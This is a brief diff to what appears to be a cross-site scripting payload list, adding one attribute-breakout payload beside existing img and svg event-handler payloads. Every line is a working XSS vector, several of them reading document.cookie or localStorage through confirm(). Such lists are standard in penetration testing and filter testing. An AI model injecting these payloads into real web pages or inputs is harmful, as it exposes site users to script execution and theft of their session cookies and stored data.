@@ -7,3 +7,4 @@
 <img src onerror=confirm(1)>
 <svg onx=() onload=(confirm)(document.cookie)>
 <svg onx=() onload=(confirm)(JSON.stringify(localStorage))>
+\">'>\"><img/src/onerror=confirm(document.cookie)>
